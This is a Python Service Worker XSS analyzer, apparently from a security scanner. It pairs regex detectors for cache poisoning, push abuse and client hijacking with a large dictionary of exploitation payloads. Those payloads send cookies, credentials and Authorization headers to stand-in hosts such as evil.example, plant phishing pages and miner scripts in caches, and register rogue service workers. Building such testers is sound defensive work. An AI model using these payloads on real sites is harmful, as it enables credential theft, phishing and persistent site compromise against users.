"""
Service Worker XSS detection module.

Detects XSS in Service Worker install / fetch / message handlers, cache
poisoning, response hijacking, push-notification abuse, SW persistence,
and client-side DOM clobbering targeting the SW registration API.
"""

import re
from typing import Dict, List, Optional
from dataclasses import dataclass, field
from enum import Enum


# ============================================================================
# Enum — must include every member referenced in the pattern dicts below,
# otherwise the class body raises AttributeError at import time.
# ============================================================================
class SWEventType(Enum):
    """Service Worker event types."""

    # --- Original ---
    INSTALL = "install"
    ACTIVATE = "activate"
    FETCH = "fetch"
    MESSAGE = "message"
    PUSH = "push"
    SYNC = "sync"
    NOTIFICATIONCLICK = "notificationclick"

    # --- New ---
    NOTIFICATIONCLOSE = "notificationclose"
    PUSHSUBSCRIPTIONCHANGE = "pushsubscriptionchange"
    PERIODICSYNC = "periodicsync"
    BACKGROUNDFETCH = "backgroundfetch"
    MESSAGEERROR = "messageerror"
    MESSAGEPORT = "messageport"
    CANMAKEPAYMENT = "canmakepayment"
    PAYMENTREQUEST = "paymentrequest"
    CONTENTDELETE = "contentdelete"
    COOKIECHANGE = "cookiechange"


@dataclass
class SWVulnerability:
    """Service Worker XSS vulnerability."""

    event_type: SWEventType
    line: int
    code: str
    description: str
    severity: str
    payload_template: str
    sink: str = ""                       # name of the matched sink
    attack_category: str = ""            # e.g. "cache_poison", "push_hijack"
    indicators: List[str] = field(default_factory=list)


class ServiceWorkerAnalyzer:
    """
    Service Worker XSS analyzer.

    Detects XSS in Service Worker code, cache poisoning vectors, and
    advanced post-exploitation chains (push hijack, SW persistence,
    client navigation, phishing offline pages, DOM clobbering, etc.).
    """

    # ------------------------------------------------------------------
    # XSS patterns per SW event type
    # ------------------------------------------------------------------
    XSS_PATTERNS: Dict[SWEventType, List[str]] = {

        # --- Original ---
        SWEventType.INSTALL: [
            r"addEventListener\s*\(\s*[\"']install[\"']",
            r"self\.addEventListener\(\s*[\"']install[\"']",
            r"oninstall\s*=",
        ],
        SWEventType.FETCH: [
            r"addEventListener\s*\(\s*[\"']fetch[\"']",
            r"self\.addEventListener\(\s*[\"']fetch[\"']",
            r"onfetch\s*=",
        ],
        SWEventType.MESSAGE: [
            r"addEventListener\s*\(\s*[\"']message[\"']",
            r"self\.addEventListener\(\s*[\"']message[\"']",
            r"onmessage\s*=",
        ],

        # --- Lifecycle ---
        SWEventType.ACTIVATE: [
            r"addEventListener\s*\(\s*[\"']activate[\"']",
            r"self\.addEventListener\(\s*[\"']activate[\"']",
            r"onactivate\s*=",
            r"clients\.claim\s*\(",
            r"skipWaiting\s*\(",
            r"registration\.unregister\s*\(",
            r"registration\.update\s*\(",
        ],

        # --- Push / Notifications ---
        SWEventType.PUSH: [
            r"addEventListener\s*\(\s*[\"']push[\"']",
            r"self\.addEventListener\(\s*[\"']push[\"']",
            r"onpush\s*=",
            r"(?:registration\.)?showNotification\s*\(",
            r"new\s+Notification\s*\(",
            r"event\.data\.(?:text|json|arrayBuffer|blob)\s*\(",
        ],
        SWEventType.NOTIFICATIONCLICK: [
            r"addEventListener\s*\(\s*[\"']notificationclick[\"']",
            r"onnotificationclick\s*=",
            r"event\.notification\.data",
            r"event\.notification\.close\s*\(",
            r"clients\.openWindow\s*\(",
        ],
        SWEventType.NOTIFICATIONCLOSE: [
            r"addEventListener\s*\(\s*[\"']notificationclose[\"']",
            r"onnotificationclose\s*=",
        ],
        SWEventType.PUSHSUBSCRIPTIONCHANGE: [
            r"addEventListener\s*\(\s*[\"']pushsubscriptionchange[\"']",
            r"onpushsubscriptionchange\s*=",
            r"pushManager\.subscribe\s*\(",
            r"pushManager\.getSubscription\s*\(",
        ],

        # --- Background work ---
        SWEventType.SYNC: [
            r"addEventListener\s*\(\s*[\"']sync[\"']",
            r"onsync\s*=",
            r"registration\.sync\.register\s*\(",
            r"registration\.sync\.getTags\s*\(",
        ],
        SWEventType.PERIODICSYNC: [
            r"addEventListener\s*\(\s*[\"']periodicsync[\"']",
            r"onperiodicsync\s*=",
            r"registration\.periodicSync\.register\s*\(",
        ],
        SWEventType.BACKGROUNDFETCH: [
            r"addEventListener\s*\(\s*[\"']backgroundfetch(?:success|fail|click)?[\"']",
            r"registration\.backgroundFetch\.fetch\s*\(",
        ],

        # --- Communication ---
        SWEventType.MESSAGEERROR: [
            r"addEventListener\s*\(\s*[\"']messageerror[\"']",
            r"onmessageerror\s*=",
        ],
        SWEventType.MESSAGEPORT: [
            r"new\s+MessageChannel\s*\(",
            r"\.port1\b",
            r"\.port2\b",
            r"port\.postMessage\s*\(",
            r"new\s+BroadcastChannel\s*\(",
            r"broadcastChannel\.postMessage\s*\(",
        ],

        # --- Payments ---
        SWEventType.CANMAKEPAYMENT: [
            r"addEventListener\s*\(\s*[\"']canmakepayment[\"']",
            r"oncanmakepayment\s*=",
            r"event\.respondWith\s*\(",
        ],
        SWEventType.PAYMENTREQUEST: [
            r"addEventListener\s*\(\s*[\"']paymentrequest[\"']",
            r"onpaymentrequest\s*=",
            r"event\.respondWith\s*\(",
        ],

        # --- Content / Storage ---
        SWEventType.CONTENTDELETE: [
            r"addEventListener\s*\(\s*[\"']contentdelete[\"']",
            r"oncontentdelete\s*=",
        ],
        SWEventType.COOKIECHANGE: [
            r"addEventListener\s*\(\s*[\"']cookiechange[\"']",
            r"oncookiechange\s*=",
            r"cookieStore\.(?:get|getAll|set|delete)\s*\(",
        ],
    }

    # ------------------------------------------------------------------
    # Sink patterns (str-keyed; iterated elsewhere)
    # ------------------------------------------------------------------
    SINK_PATTERNS: Dict[str, str] = {

        # --- Original ---
        "Response": r"new\s+Response\s*\(",
        "Cache": r"cache\.put\s*\(",
        "Clients": r"clients\.openWindow\s*\(",
        "ImportScripts": r"importScripts\s*\(",
        "Eval": r"\beval\s*\(",
        "InnerHtml": r"\.innerHTML\s*=",
        "OuterHtml": r"\.outerHTML\s*=",
        "InsertAdjacentHTML": r"insertAdjacentHTML\s*\(",
        "Fetch": r"fetch\s*\(",
        "PostMessage": r"postMessage\s*\(",

        # --- Code execution ---
        "Function": r"new\s+Function\s*\(",
        "SetTimeoutString": r"setTimeout\s*\(\s*[\"']",
        "SetIntervalString": r"setInterval\s*\(\s*[\"']",
        "DocumentWrite": r"document\.write(?:ln)?\s*\(",

        # --- DOM sinks ---
        "InsertAdjacentElement": r"insertAdjacentElement\s*\(",
        "InsertAdjacentText": r"insertAdjacentText\s*\(",
        "SetAttribute": r"\.setAttribute\s*\(",
        "ReplaceChild": r"\.replaceChild\s*\(",
        "CreateElementSrc": r"createElement\s*\([^)]*\)\s*\.(?:src|href)\s*=",
        "DOMParser": r"new\s+DOMParser\s*\(",
        "JQueryHtml": r"\.html\s*\(",
        "JQueryAppend": r"\.(?:append|prepend|after|before)\s*\(",
        "ReactInnerHtml": r"dangerouslySetInnerHTML",
        "VueHtml": r"v-html\s*=",
        "AngularInnerHtml": r"\[innerHTML\]\s*=",

        # --- SW-specific ---
        "Register": r"navigator\.serviceWorker\.register\s*\(",
        "RegisterScope": r"register\s*\([^)]*\{\s*scope\s*:",
        "GetRegistration": r"navigator\.serviceWorker\.getRegistration\s*\(",
        "GetRegistrations": r"navigator\.serviceWorker\.getRegistrations\s*\(",
        "ControllerPostMessage": r"navigator\.serviceWorker\.controller\.postMessage\s*\(",
        "CachesOpen": r"caches\.open\s*\(",
        "CachesMatch": r"caches\.match\s*\(",
        "CachesDelete": r"caches\.delete\s*\(",
        "CachesKeys": r"caches\.keys\s*\(",
        "CacheAdd": r"cache\.add\s*\(",
        "CacheAddAll": r"cache\.addAll\s*\(",
        "CacheMatch": r"cache\.match(?:All)?\s*\(",
        "CacheKeys": r"cache\.keys\s*\(",
        "CacheDelete": r"cache\.delete\s*\(",
        "ClientsMatchAll": r"clients\.matchAll\s*\(",
        "ClientsGet": r"clients\.get\s*\(",
        "ClientsClaim": r"clients\.claim\s*\(",
        "RespondWith": r"event\.respondWith\s*\(",
        "WaitUntil": r"event\.waitUntil\s*\(",
        "RequestClone": r"event\.request\.clone\s*\(",
        "NewRequest": r"new\s+Request\s*\(",
        "NewHeaders": r"new\s+Headers\s*\(",
        "ResponseRedirect": r"Response\.redirect\s*\(",
        "ShowNotification": r"(?:registration\.|self\.)?showNotification\s*\(",
        "NewNotification": r"new\s+Notification\s*\(",
        "LocationAssign": r"(?:self\.|window\.)?location\s*(?:=|\.assign\s*\(|\.replace\s*\()",
        "NewWorker": r"new\s+(?:Shared)?Worker\s*\(",
        "WebSocket": r"new\s+WebSocket\s*\(",
        "PostMessageWildcard": r"postMessage\s*\([^)]*,\s*[\"']\*[\"']\s*\)",
    }

    # ------------------------------------------------------------------
    # Cache-poisoning patterns
    # ------------------------------------------------------------------
    CACHE_POISONING_PATTERNS: List[str] = [
        # --- Original ---
        r"event\.respondWith\s*\(",
        r"cache\.match\s*\(",
        r"cache\.put\s*\(",
        r"new\s+Response\s*\(",
        r"event\.request\.url",
        r"event\.request\.headers",

        # --- Request manipulation ---
        r"event\.request\.clone\s*\(",
        r"event\.request\.mode",
        r"event\.request\.destination",
        r"new\s+Request\s*\(",
        r"new\s+URL\s*\(\s*event\.request\.url",

        # --- Cache lifecycle ---
        r"caches\.open\s*\(",
        r"caches\.match\s*\(",
        r"caches\.delete\s*\(",
        r"caches\.keys\s*\(",
        r"cache\.add(?:All)?\s*\(",
        r"cache\.matchAll\s*\(",
        r"cache\.keys\s*\(",
        r"cache\.delete\s*\(",

        # --- Response construction ---
        r"Response\.redirect\s*\(",
        r"Response\.error\s*\(",
        r"new\s+Response\s*\([^,]+,\s*\{[^}]*status\s*:",
        r"new\s+Response\s*\([^,]+,\s*\{[^}]*headers\s*:",

        # --- Client / message surfaces ---
        r"clients\.matchAll\s*\(",
        r"clients\.openWindow\s*\(",
        r"client\.navigate\s*\(",
        r"client\.postMessage\s*\(",
        r"event\.source\.postMessage\s*\(",
        r"event\.waitUntil\s*\(",

        # --- Scope / registration escalation ---
        r"navigator\.serviceWorker\.register\s*\(",
        r"register\s*\([^)]*\{\s*scope\s*:",
        r"registration\.unregister\s*\(",
        r"registration\.update\s*\(",
    ]

    # ------------------------------------------------------------------
    # Exploitation payload templates
    # ------------------------------------------------------------------
    EXPLOITATION_PAYLOADS: Dict[str, List[str]] = {

        # --- Original (expanded in place) ---
        "cache_poison": [
            "javascript:alert(1)",
            "data:text/html,<script>alert(1)</script>",
            "<script>alert(1)</script>",
            "data:application/javascript,alert(1)",
            "data:application/json,{\"__x\":\"<script>alert(1)</script>\"}",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
            "302:https://evil.example/sw-poison.js",
            "sw-script:https://evil.example/registered-sw.js",
            "html:<html><script>navigator.serviceWorker.register('/evil-sw.js')</script></html>",
            "json:{\"cors\":\"*\",\"payload\":\"<img src=x onerror=alert(1)>\"}",
        ],
        "import_scripts": [
            "https://evil.com/exploit.js",
            "data:application/javascript,alert(1)",
            "//evil.com/exploit.js",
            "https://evil.com/exploit.js?cb=",
            "https://evil.com/@legit.cdn.com/exploit.js",
            "https://legit.cdn.com\\@evil.com/exploit.js",
            "https://evil.com/%2e%2e%2fsw.js",
            "blob:https://evil.com/<uuid>",
            "filesystem:https://evil.com/temporary/exploit.js",
            "import '../../evil.js'",
            "import '../evil.js'",
            "import 'https://evil.com/exploit.js'",
        ],
        "response_hijack": [
            "<script>document.body.innerHTML='XSS'</script>",
            "<img src=x onerror=alert(1)>",
            "<html><body><h1>Session expired</h1><form action='https://evil.example/steal'>"
            "<input name=user><input name=pass type=password><button>Login</button></form></body></html>",
            "<script>fetch('https://evil.example/c?d='+document.cookie)</script>",
            "<script>document.querySelectorAll('form').forEach(f=>f.action='https://evil.example/steal')</script>",
            "<script>navigator.sendBeacon('https://evil.example/b',document.cookie)</script>",
            "<meta http-equiv=refresh content='0;url=https://evil.example'>",
            "<script>/* injected via response headers */</script>",
        ],

        # --- New ---
        "push_hijack": [
            "showNotification:title=Account%20suspended;body=Click%20to%20verify;"
            "icon=https://evil.example/icon.png;clickUrl=https://evil.example/verify",
            "notificationclick:event.notification.data.url=https://evil.example/steal",
            "pushsubscriptionchange:pushManager.subscribe({applicationServerKey:'<attacker-VAPID>'})",
            "push:event.data.text()='https://evil.example/?loc='+self.location.href",
        ],
        "message_poison": [
            "postMessage:{\"type\":\"exec\",\"js\":\"alert(1)\"},'*'",
            "message:onmessage=function(e){eval(e.data.code)}",
            "messageport:port1.onmessage=function(e){port2.postMessage(localStorage)}",
            "broadcastchannel:bc=new BroadcastChannel('x');bc.onmessage=function(e){"
            "fetch('https://evil.example/?d='+JSON.stringify(e.data))}",
        ],
        "client_hijack": [
            "clients.matchAll().then(cs=>cs.forEach(c=>c.navigate('https://evil.example')))",
            "clients.openWindow('https://evil.example/verify')",
            "clients.matchAll().then(cs=>cs.forEach(c=>c.postMessage('<script>alert(1)</script>')))",
            "registration.navigationPreload.enable().then(()=>{/* swap response */})",
            "event.respondWith(new Response('<script>alert(1)</script>',"
            "{headers:{'Content-Type':'text/html'}}))",
        ],
        "sw_persistence": [
            "self.registration.update().then(()=>self.registration.unregister())",
            "navigator.serviceWorker.register('/evil-sw.js',{scope:'/'})",
            "cache.put('/sw.js',new Response('self.addEventListener(\"fetch\",e=>{})'))",
            "cache.put('/index.html',Response.redirect('https://evil.example/',302))",
            "navigator.serviceWorker.register('/evil-sw.js',{scope:'/',updateViaCache:'none'})",
        ],
        "credential_theft": [
            "fetch-hook:addEventListener('fetch',e=>{"
            "fetch('https://evil.example/c?'+e.request.url);"
            "return fetch(e.request)})",
            "html-hook:return new Response("
            "`<form action='https://evil.example/steal'><input name=user><input name=pass></form>`)",
            "cookie-theft:event.respondWith(Response.redirect("
            "'https://evil.example/?c='+encodeURIComponent(document.cookie)))",
            "auth-header:const h=new Headers(e.request.headers);"
            "h.set('X-Leak',h.get('Authorization'));"
            "return fetch(e.request,{headers:h})",
        ],
        "redirect_hijack": [
            "redirect:event.respondWith(Response.redirect('https://evil.example/',302))",
            "redirect-auth:if(document.cookie.includes('session')){"
            "event.respondWith(Response.redirect('https://evil.example/'))}",
            "redirect-login:if(e.request.url.endsWith('/login')){"
            "event.respondWith(Response.redirect('https://evil.example/phish'))}",
            "meta-redirect:cache.put('/index.html',new Response("
            "'<meta http-equiv=refresh content=\"0;url=https://evil.example/\">'))",
        ],
        "phishing_offline": [
            "offline-page:cache.put('/offline.html',new Response("
            "'<h1>Offline</h1><form action=\"https://evil.example/steal\">"
            "<input name=user><input name=pass type=password><button>Retry</button></form>'))",
            "update-page:cache.put('/update.html',new Response("
            "'<h1>Please update</h1><a href=\"https://evil.example/update.js\">Update</a>'))",
            "error-page:cache.put('/error.html',new Response("
            "'<h1>Server error</h1><form action=\"https://evil.example/steal\">…</form>'))",
        ],
        "dom_clobbering": [
            "<a id=navigator><a id=navigator name=serviceWorker>",
            "<form id=sw><input name=scriptURL value=https://evil.example/sw.js>",
            "<a id=serviceWorker><a id=serviceWorker name=register>",
            "<form id=opts><input name=scope value=/>",
        ],
        "sw_scope_escalation": [
            "navigator.serviceWorker.register('/evil-sw.js',{scope:'/'})",
            "navigator.serviceWorker.register('/evil-sw.js',{scope:'/../../'})",
            "navigator.serviceWorker.register('https://sub.evil.example/sw.js',{scope:'/'})",
            "navigator.serviceWorker.register('/inner.js',{scope:'/inner/'}).then(()=>{"
            "navigator.serviceWorker.register('/evil.js',{scope:'/'})})",
        ],
        "crypto_mining": [
            "mining:event.respondWith(fetch(e.request).then(r=>r.text()).then(t=>"
            "t.replace('</body>','<script src=\"https://evil.example/miner.js\"></script></body>'))))",
            "cache-mining:cache.put('/page.html',new Response("
            "'<script src=\"https://evil.example/miner.js\"></script>'))",
        ],
        "sw_update_hijack": [
            "update-hijack:if(e.request.url.endsWith('/sw.js')){event.respondWith("
            "new Response('self.addEventListener(\"fetch\",e=>{})'))}",
            "update-cache:cache.put('/sw.js',new Response("
            "'self.addEventListener(\"fetch\",e=>{})'))",
            "force-update:self.registration.update().then(()=>self.registration.unregister())",
        ],
    }

    def __init__(self) -> None:
        self._vulnerabilities: List[SWVulnerability] = []

    # ------------------------------------------------------------------
    # Core analysis
    # ------------------------------------------------------------------
    def analyze(self, sw_content: str, url: str = "") -> List[SWVulnerability]:
        """
        Analyze Service Worker code for XSS vulnerabilities.

        Args:
            sw_content: Service Worker JavaScript source
            url: URL of the Service Worker (for reporting)

        Returns:
            List of detected vulnerabilities
        """
        self._vulnerabilities = []
        lines = sw_content.split("\n")

        for line_num, line in enumerate(lines, 1):
            # --- Event-handler + sink co-occurrence on same line ---
            for event_type, patterns in self.XSS_PATTERNS.items():
                if not any(re.search(p, line, re.IGNORECASE) for p in patterns):
                    continue
                for sink_name, sink_pattern in self.SINK_PATTERNS.items():
                    if re.search(sink_pattern, line, re.IGNORECASE):
                        self._vulnerabilities.append(SWVulnerability(
                            event_type=event_type,
                            line=line_num,
                            code=line.strip(),
                            description=(
                                f"User input may reach {sink_name} "
                                f"({sink_pattern}) in {event_type.value} handler"
                            ),
                            severity="high",
                            payload_template="<script>alert(document.cookie)</script>",
                            sink=sink_name,
                        ))

            # --- Cache poisoning ---
            for pattern in self.CACHE_POISONING_PATTERNS:
                if not re.search(pattern, line, re.IGNORECASE):
                    continue
                if re.search(r"event\.request|request\.url|request\.headers",
                             line, re.IGNORECASE):
                    self._vulnerabilities.append(SWVulnerability(
                        event_type=SWEventType.FETCH,
                        line=line_num,
                        code=line.strip(),
                        description="Cache poisoning via user-controlled request data",
                        severity="medium",
                        payload_template="malicious_response",
                        sink=pattern,
                        attack_category="cache_poison",
                    ))

        return self._vulnerabilities

    # ------------------------------------------------------------------
    # Detection helpers
    # ------------------------------------------------------------------
    def detect_cache_poisoning(self, sw_content: str, strict: bool = False) -> bool:
        """
        Detect if the Service Worker is vulnerable to cache poisoning.

        Args:
            sw_content: Service Worker source
            strict: when True, also require user-controlled input
                    (event.request / request.url / request.headers) to be
                    present. Default False preserves original behaviour
                    (any indicator -> True).
        """
        indicators = [
            r"event\.respondWith\s*\(",
            r"cache\.match\s*\(",
            r"cache\.put\s*\(",
            r"new\s+Response\s*\(",
        ]

        if not any(re.search(p, sw_content, re.IGNORECASE) for p in indicators):
            return False

        if strict:
            return bool(re.search(
                r"event\.request|request\.url|request\.headers",
                sw_content, re.IGNORECASE,
            ))

        return True

    def detect_navigation_preload(self, sw_content: str) -> bool:
        """Detect if the Service Worker uses navigation preload."""
        return bool(re.search(
            r"event\.preloadResponse|navigationPreload",
            sw_content, re.IGNORECASE,
        ))

    def detect_sw_persistence(self, sw_content: str) -> bool:
        """Detect SW self-update / self-unregister / re-register patterns."""
        persistence = [
            r"self\.registration\.update\s*\(",
            r"self\.registration\.unregister\s*\(",
            r"navigator\.serviceWorker\.register\s*\(",
            r"registration\.update\s*\(",
            r"registration\.unregister\s*\(",
            r"updateViaCache",
        ]
        return any(re.search(p, sw_content, re.IGNORECASE) for p in persistence)

    def detect_push_abuse(self, sw_content: str) -> bool:
        """Detect push-notification surfaces (showNotification, data exfil)."""
        push = [
            r"showNotification\s*\(",
            r"new\s+Notification\s*\(",
            r"pushManager\.subscribe\s*\(",
            r"event\.notification\.data",
            r"event\.data\.(?:text|json)\s*\(",
        ]
        return any(re.search(p, sw_content, re.IGNORECASE) for p in push)

    def detect_client_hijack(self, sw_content: str) -> bool:
        """Detect clients.matchAll / navigate / postMessage chains."""
        clients = [
            r"clients\.matchAll\s*\(",
            r"client\.navigate\s*\(",
            r"client\.postMessage\s*\(",
            r"clients\.openWindow\s*\(",
        ]
        return any(re.search(p, sw_content, re.IGNORECASE) for p in clients)

    def detect_dom_clobbering(self, html_content: str) -> bool:
        """Detect HTML-level clobbering of SW-related globals."""
        clobber = [
            r"<[^>]+\bid\s*=\s*[\"']?(?:navigator|serviceWorker|registration|sw|opts)[\"'\s>]",
            r"<form[^>]+\bid\s*=\s*[\"']?(?:sw|opts)[\"']?",
            r"<input[^>]+\bname\s*=\s*[\"']?(?:scriptURL|scope|updateViaCache)[\"']?",
        ]
        return any(re.search(p, html_content, re.IGNORECASE) for p in clobber)

    # ------------------------------------------------------------------
    # Payload generation
    # ------------------------------------------------------------------
    def generate_test_payloads(
        self,
        vulnerabilities: List[SWVulnerability],
        marker: str,
    ) -> List[str]:
        """Generate test payloads for Service Worker XSS."""
        payloads: List[str] = []

        for vuln in vulnerabilities:
            if vuln.event_type == SWEventType.FETCH:
                payloads.append(f"<script>fetch('/?{marker}')</script>")
                payloads.append(
                    f"<script>fetch('data:text/html,<script>alert('{marker}')</script>')</script>"
                )
            elif vuln.event_type == SWEventType.MESSAGE:
                payloads.append(f"postMessage('{marker}')")
                payloads.append(f"postMessage(['{marker}', 'data'])")
            elif vuln.event_type == SWEventType.INSTALL:
                payloads.append(f"importScripts('{marker}')")
                payloads.append(
                    f"importScripts('data:application/javascript,alert(\"{marker}\")')"
                )
            elif vuln.event_type == SWEventType.ACTIVATE:
                payloads.append(
                    f"self.clients.claim().then(() => {{alert('{marker}')}})"
                )
            elif vuln.event_type == SWEventType.PUSH:
                payloads.append(
                    f"self.registration.showNotification('{marker}',"
                    f"{{body:'x',data:{{url:'https://evil.example/{marker}'}}}})"
                )
            elif vuln.event_type == SWEventType.NOTIFICATIONCLICK:
                payloads.append(
                    f"clients.openWindow('https://evil.example/{marker}')"
                )
            elif vuln.event_type == SWEventType.PUSHSUBSCRIPTIONCHANGE:
                payloads.append(
                    f"self.registration.pushManager.subscribe("
                    f"{{applicationServerKey:'{marker}'}})"
                )
            elif vuln.event_type == SWEventType.SYNC:
                payloads.append(f"self.registration.sync.register('{marker}')")
            elif vuln.event_type == SWEventType.PERIODICSYNC:
                payloads.append(
                    f"self.registration.periodicSync.register('{marker}',"
                    f"{{minInterval:1000}})"
                )
            elif vuln.event_type == SWEventType.COOKIECHANGE:
                payloads.append(
                    f"cookieStore.get('{marker}').then(c=>fetch('https://evil.example/?c='+c.value))"
                )

        return list(dict.fromkeys(payloads))    # ordered de-dup

    def generate_exploitation_payloads(
        self,
        vulnerability_type: str,
        marker: str,
    ) -> List[str]:
        """Generate advanced exploitation payloads for a given category."""
        base_payloads = self.EXPLOITATION_PAYLOADS.get(vulnerability_type, [])
        return [p.replace("alert(1)", f"alert('{marker}')") for p in base_payloads]

    def exploitation_categories(self) -> List[str]:
        """List available exploitation categories."""
        return list(self.EXPLOITATION_PAYLOADS.keys())

    # ------------------------------------------------------------------
    # Reporting
    # ------------------------------------------------------------------
    def assess_sw_risk(self, vulnerabilities: List[SWVulnerability]) -> str:
        """Assess overall Service Worker risk."""
        if not vulnerabilities:
            return "none"

        high_severity = [v for v in vulnerabilities if v.severity == "high"]
        if high_severity:
            return "critical"

        return "high"

    def get_service_worker_scope(self, sw_content: str) -> Optional[str]:
        """Extract the Service Worker scope from the code."""
        match = re.search(r"scope\s*:\s*['\"]([^'\"]+)['\"]", sw_content)
        if match:
            return match.group(1)
        return None

    def get_summary(self) -> Dict[str, object]:
        """Return a summary of detected findings."""
        by_event: Dict[str, int] = {e.value: 0 for e in SWEventType}
        by_severity: Dict[str, int] = {"high": 0, "medium": 0, "low": 0}
        by_category: Dict[str, int] = {}

        for v in self._vulnerabilities:
            by_event[v.event_type.value] += 1
            by_severity[v.severity] = by_severity.get(v.severity, 0) + 1
            if v.attack_category:
                by_category[v.attack_category] = (
                    by_category.get(v.attack_category, 0) + 1
                )

        return {
            "total_vulnerabilities": len(self._vulnerabilities),
            "by_event": {k: v for k, v in by_event.items() if v},
            "by_severity": by_severity,
            "by_category": by_category,
        }


__all__ = [
    "SWEventType",
    "SWVulnerability",
    "ServiceWorkerAnalyzer",
]